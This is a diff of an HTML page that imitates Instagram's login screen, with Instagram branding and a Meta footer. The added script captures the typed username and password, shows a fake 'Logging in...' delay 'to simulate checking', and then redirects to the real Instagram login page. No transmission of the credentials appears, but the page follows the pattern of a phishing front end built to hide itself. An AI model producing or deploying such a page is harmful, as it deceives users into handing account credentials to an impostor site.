@@ -1,149 +1,177 @@
-
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram Login</title>
+    <title>Instagram</title>
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
     <style>
         body {
-            background-color: #fafafa;
+            background-color: #121212; /* Dark Mode Background */
+            color: #ffffff;
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
+            flex-direction: column;
         }
 
-        .login-container {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
+        .container {
+            background-color: #000000;
+            border: 1px solid #363636;
             padding: 40px;
-            width: 350px;
+            width: 320px;
             text-align: center;
-            margin-bottom: 10px;
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
         }
 
         .logo {
-            font-family: 'Grand Hotel', cursive; /* Fallback if Google Fonts isn't linked, but using system font for simplicity */
+            font-family: 'Grand Hotel', cursive;
             font-size: 36px;
             margin-bottom: 20px;
-            font-weight: normal;
-            font-style: italic;
+            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-top: 10px;
         }
 
-        .input-group {
-            margin-bottom: 6px;
-        }
-
-        input {
+        .input-field {
             width: 100%;
-            padding: 14px 8px;
-            background: #fafafa;
-            border: 1px solid #dbdbdb;
+            padding: 12px 10px;
+            background: #121212;
+            border: 1px solid #363636;
             border-radius: 3px;
+            color: #fafafa;
             font-size: 12px;
             box-sizing: border-box;
             outline: none;
         }
 
-        input:focus {
+        .input-field:focus {
             border: 1px solid #a8a8a8;
         }
 
         .login-btn {
-            background-color: #0095f6;
+            background-color: #363636;
             border: none;
-            color: #fff;
-            padding: 7px 16px;
+            color: #ffffff;
+            padding: 8px 16px;
             border-radius: 8px;
             width: 100%;
             font-weight: 600;
             font-size: 14px;
             cursor: pointer;
             margin-top: 10px;
-            margin-bottom: 10px;
-        }
-
-        .login-btn:disabled {
             opacity: 0.7;
-            cursor: default;
         }
 
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 18px 0;
-        }
-
-        .line {
-            flex-grow: 1;
-            height: 1px;
-            background-color: #dbdbdb;
-        }
-
-        .or-text {
-            margin: 0 16px;
-            font-size: 13px;
-            font-weight: 600;
-            color: #8e8e8e;
-            text-transform: uppercase;
+        .login-btn.active {
+            background-color: #4d4d4d;
+            opacity: 1;
         }
 
         .forgot {
-            display: block;
-            color: #00376b;
+            color: #c395e0; /* Instagram-ish purple link color */
             font-size: 12px;
             text-decoration: none;
-            margin-top: 16px;
-            margin-bottom: 20px;
+            margin-top: 10px;
+            display: block;
         }
 
-        .signup-box {
-            background-color: #fff;
-            border: 1px solid #dbdbdb;
-            padding: 20px;
-            width: 350px;
-            text-align: center;
-            font-size: 14px;
+        .divider {
+            height: 1px;
+            background-color: #363636;
+            margin: 10px 0;
+            width: 100%;
         }
 
-        .signup-box a {
-            color: #0095f6;
-            text-decoration: none;
+        .signup-btn {
+            background-color: transparent;
+            border: 1px solid #363636;
+            color: #ffffff;
+            padding: 10px 16px;
+            border-radius: 8px;
+            width: 100%;
             font-weight: 600;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+        
+        .meta-logo {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #737373;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 5px;
         }
     </style>
-    <!-- Google Font for Logo -->
-    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap" rel="stylesheet">
 </head>
 <body>
 
-    <div style="display: flex; flex-direction: column; align-items: center; gap: 10px;">
-        <div class="login-container">
-            <div class="logo">Instagram</div>
-            <form>
-                <div class="input-group">
-                    <input type="text" placeholder="Phone number, username, or email" required>
-                </div>
-                <div class="input-group">
-                    <input type="password" placeholder="Password" required>
-                </div>
-                <button type="submit" class="login-btn">Log in</button>
-            </form>
-            <div class="divider">
-                <div class="line"></div>
-                <span class="or-text">or</span>
-                <div class="line"></div>
-            </div>
-            <a href="#" class="forgot">Forgot password?</a>
-        </div>
+    <div class="container">
+        <div class="logo">Instagram</div>
         
-        <div class="signup-box">
-            Don't have an account? <a href="#">Sign up</a>
-        </div>
+        <form id="loginForm">
+            <input type="text" class="input-field" id="username" placeholder="Username, email or mobile number" required>
+            <input type="password" class="input-field" id="password" placeholder="Password" required>
+            
+            <button type="submit" class="login-btn" id="loginBtn">Log in</button>
+            
+            <a href="#" class="forgot">Forgot password?</a>
+        </form>
+        
+        <div class="divider"></div>
+        
+        <button class="signup-btn">Create new account</button>
     </div>
+
+    <div class="meta-logo">
+        <span>&#8734;</span> Meta
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+
+        // Enable button only if both fields are filled
+        function checkInputs() {
+            if (usernameInput.value.length > 0 && passwordInput.value.length > 0) {
+                loginBtn.classList.add('active');
+                loginBtn.style.backgroundColor = '#4d4d4d';
+            } else {
+                loginBtn.classList.remove('active');
+                loginBtn.style.backgroundColor = '#363636';
+            }
+        }
+
+        usernameInput.addEventListener('input', checkInputs);
+        passwordInput.addEventListener('input', checkInputs);
+
+        form.addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const user = usernameInput.value;
+            const pass = passwordInput.value;
+
+            // Visual feedback
+            loginBtn.textContent = "Logging in...";
+            
+            setTimeout(() => {
+                // Redirect to the actual Instagram login page
+                // Note: This uses the real Instagram login URL
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            }, 1000); // 1 second delay to simulate "checking"
+        });
+    </script>
 
 </body>
 </html>
